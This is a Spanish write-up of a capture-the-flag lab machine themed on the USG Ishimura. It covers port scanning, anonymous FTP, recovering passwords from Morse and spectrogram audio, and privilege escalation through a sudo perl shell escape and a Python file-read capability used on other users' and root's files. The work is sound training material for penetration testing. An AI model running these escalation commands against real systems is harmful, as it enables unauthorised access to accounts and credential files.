# Reconocimiento

En primer lugar, se averigua la IP de la máquina.

```c
sudo netdiscover

...
192.168.1.146   08:00:27:be:0e:ae      1      60  PCS Systemtechnik GmbH
...

```

```
192.168.1.146
```

Una vez la tenemos, se lanza un escaneo de puertos a los 10000 más comunes, identificando versiones, servicios y OS vía TCP y generando un reporte HTML para análisis más cómodo.

```c
nmap --top-ports=10000 --open -T5 -A -Pn -n -v 192.168.1.146 -oX nmap_1.xml && xsltproc nmap_1.xml -o nmap_1.html
```

De los resultados, llama la atención un servidor FTP abierto que permite login anónimo, el cual contiene un archivo .wav (posible esteganografía), hay también un servidor SSH y otro HTTP, ambos en el puerto estándar.

```c
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.3  
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)  // LOGIN ANÓNIMO PERMITIDO !
|_-rw-r--r--    1 0        0         1900094 Jan 15 22:20 what_the_fuck.wav  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:192.168.1.145  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 2  
|      vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)  
| ssh-hostkey:    
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)  
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)  
80/tcp open  http    Apache httpd 2.4.62 ((Debian))  
|_http-title: Apache2 Debian Default Page: It works  
|_http-server-header: Apache/2.4.62 (Debian)  
| http-methods:    
|_  Supported Methods: HEAD GET POST OPTIONS  
MAC Address: 08:00:27:BE:0E:AE (Oracle VirtualBox virtual NIC)
```


## FTP
Entramos al servidor FTP y traemos el archivo para analizarlo.

```c
/home/Shared/Ishimura ❯ ftp 192.168.1.146                                                                                     ✘ INT kali@kali  
Connected to 192.168.1.146.  
220 (vsFTPd 3.0.3)  
Name (192.168.1.146:kali): anonymous  // INICIAMOS SESIÓN COMO ANÓNIMO
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls  
229 Entering Extended Passive Mode (|||41134|)  
150 Here comes the directory listing.  
-rw-r--r--    1 0        0         1900094 Jan 15 22:20 what_the_fuck.wav  
226 Directory send OK.  
ftp> get what_the_fuck.wav // DESCARGAMOS EL ARCHIVO
local: what_the_fuck.wav remote: what_the_fuck.wav  
229 Entering Extended Passive Mode (|||46714|)  
150 Opening BINARY mode data connection for what_the_fuck.wav (1900094 bytes).  
100% |*************************************************************************************************|  1855 KiB   19.74 MiB/s    00:00 ETA  
226 Transfer complete.  
1900094 bytes received in 00:00 (19.70 MiB/s)  
ftp> exit
```


## Morse
Al reproducir el archivo, veo que se trata de código morse, y gracias a esta página https://morsecode.world/international/decoder/audio-decoder-adaptive.html puedo decodificar el código y averiguar cual es el mensaje que contiene.

```
LA CONTRASENA DE CHEN ES GATONEGROISHIMURA<AR>
```

Con esto asumo que podré entrar por SSH a la cuenta de Chen.

```sh
chen@TheHackersLabs-USG-Ishimura:~$ whoami  
chen
```


# Escalada

Nada más entrar y ejecutar `sudo -l`, veo que puedo ejecutar `perl` como el usuario 'hammond', sin embargo, al tratar de pivotar a dicho usuario.

```c
chen@TheHackersLabs-USG-Ishimura:~$ sudo -u hammond perl -e 'exec "/bin/bash"'

   ___    __    __________  _________    
  /   |  / /   / ____/ __ \/_  __/   |  
 / /| | / /   / __/ / /_/ / / / / /| |  
/ ___ |/ /___/ /___/ _, _/ / / / ___ |  
/_/  |_/_____/_____/_/ |_| /_/ /_/  |_|  
                                         
SISTEMA COMPROMETIDO - PROTOCOLO DE PURGA ACTIVO  
  
hammond@TheHackersLabs-USG-Ishimura:/home/chen$    
[ALERTA] ¿Realmente creiste que estarias a salvo aqui, hammond?  
  
  
[CRITICAL] Detectando rastro de origen... Extrayendo datos de la Ishimura...  
  
Terminado (killed)
```

En la máquina hay un total de 4 usuarios, comprobando los permisos de `/home` veo que puedo acceder al directorio de hammond, donde hay varios archivos.

```python
cat /etc/passwd
chen:x:1001:1001::/home/chen:/bin/bash  
kendra:x:1002:1002::/home/kendra:/bin/bash  
hammond:x:1003:1003::/home/hammond:/bin/bash  
mercer:x:1004:1004::/home/mercer:/bin/**bash**

chen@TheHackersLabs-USG-Ishimura:/home/hammond$ ls  
NOTAS_DEL_OFICIAL.txt  nota_seguridad.txt  user.txt

chen@TheHackersLabs-USG-Ishimura:/home/hammond$ cat *  
[LOG DE OPERACIONES]  
- El Dr. Mercer ha bloqueado el acceso al Nucleo.  
- Kendra dice tener un plan de contingencia, pero no confia en mi.  
- He visto que guarda sus credenciales en un archivo llamado 'CRED_ACCESO_SISTEMA.txt' dentro de su home.  
- He configurado el binario de Python para intentar leer su archivo desde mi cuenta,  
 pero Mercer me tiene vigilado con su script.  
[INFORME DE SEGURIDAD - NIVEL 3]  
He detectado que el Dr. Mercer utiliza un hash de 32 caracteres  
para su terminal. Mi equipo de analisis sugiere que es un MD5  
de una palabra sagrada.  
  
Si logras entrar a su sistema, busca el archivo.  
Cuidado: Mercer tiene un script de defensa activo.  
Debes ser rapido.
```

Resulta que el script que estaba impidiéndonos pivotar al usuario hammond está en `/opt`, y si hacemos `ps aux` rápido antes de que cierre la shell se ve que es el propio hammond quien ejecuta el script.

```
hammond     1070  0.0  0.1   6932  3260 pts/1    S    18:51   0:00 /bin/bash /opt/.sistema_nervioso.sh
```

Con un poco de rapidez lo podemos detener a tiempo

```c
hammond@TheHackersLabs-USG-Ishimura:/opt$ ps    
   PID TTY          TIME CMD  
  1141 pts/1    00:00:00 bash  
  1145 pts/1    00:00:00 .sistema_nervio  
  1146 pts/1    00:00:00 sleep  
  1148 pts/1    00:00:00 ps  
hammond@TheHackersLabs-USG-Ishimura:/opt$ kill 1145
[ALERTA] ¿Realmente creiste que estarias a salvo aqui, hammond?  
 
hammond@TheHackersLabs-USG-Ishimura:/opt$ whoami  
hammond  
```

Buscando que hacer con hammond, le doy un segundo vistazo a las notas y veo que las había leído mal, donde yo entendí que había programado un script de python (que estaba buscando como loco), realmente ponía que había configurado el binario para leer el `/home` de kendra, pruebo

```c
hammond@TheHackersLabs-USG-Ishimura:~$ python3 -c 'print(open("/home/kendra/CRED_ACCESO_SISTEMA.txt").read())'  
[SISTEMA DE SEGURIDAD - NIVEL 2]  
Kendra, he detectado intrusiones. He cambiado tu acceso.  
Tu nueva contraseña es: kendra_is_watching_you  
No la compartas con Hammond, no sabemos si esta infectado.
```

## Kendra

```python
hammond@TheHackersLabs-USG-Ishimura:~$ su kendra  
Contraseña:    
kendra@TheHackersLabs-USG-Ishimura:/home/hammond$ whoami  
kendra  
...
kendra@TheHackersLabs-USG-Ishimura:~$ cat REGISTRO_SONORO.txt    
[REGISTRO DE COMUNICACIONES - ENCRIPTACIÓN DE NIVEL 5]  
Origen: Laboratorio del Dr. Mercer  
Asunto: Bloqueo de terminales del puente  
  
He interceptado una transmisión de Mercer. Ha cambiado la arquitectura  
de seguridad de la cuenta Root. No es una contraseña alfanumérica estándar.  
  
El sistema ahora valida el acceso mediante una firma de integridad de    
128 bits. La clave de generación parece ser su obsesión personal,  
su "Palabra Sagrada".    
  
Si logro extraer esa palabra del audio de la transmisión,  
solo tendré que calcular su firma digital para obtener la cadena de    
acceso final. No tengo tiempo, algo está golpeando la puerta del laboratorio...
```

Parece que tenemos un segundo archivo con un código morse, aunque no cantemos victoria tan pronto, primero hay que traerlo a la máquina, basta con usar scp.

```
kendra@TheHackersLabs-USG-Ishimura:~$ scp transmision_laboratorio.wav kali@192.168.1.145:/home/Shared/Ishimura
```

Este archivo no suena para nada a morse, así que habrá que indagar más. Al visualizar el espectograma del audio, se ve claramente que deletrea la palabra EFIGIE. De forma que teóricamente, si no he entendido mal, con pasar dicha palabra a MD5 podría accederse a root. Pruebo con todas las combinaciones posibles de mayúsculas de la palabra clave, pero nada da resultado.
Al final, opto por intentar leer archivos de `/root` con la capability de leer de python, y en el archivo `.bashrc` me encuentro con el nombre del archivo que contiene la flag.
```
python3 -c 'print(open("/root/.bashrc").read())'

...
/root/banner.sh
```

```
kendra@TheHackersLabs-USG-Ishimura:~$ python3 -c 'print(open("/root/banner.sh").read())'  
echo -e "\e[91m"  # Cambia el color a rojo para dar miedo  
cat << "BANNER"  
  
     .                                            .  
   .         LA CONVERGENCIA ES INEVITABLE         .  
     .                                            .  
 ######################################################  
 ##                                                  ##  
 ##    ¡BIENVENIDO A LA UNIDAD TOTAL, DOCTOR!        ##  
 ##                                                  ##  
 ##  Has trascendido el ruido de la Ishimura.        ##  
 ##  La Efigie te ha revelado la verdad oculta       ##  
 ##  en las frecuencias del vacío.                   ##  
 ##                                                  ##  
 ##  Ahora, todos seremos uno solo.                  ##  
 ##                                                  ##  
 ##  FLAG: *************************************     ##  
 ##                                                  ##  
 ######################################################  
  
BANNER  
echo -e "\e[0m"  # Reset color
```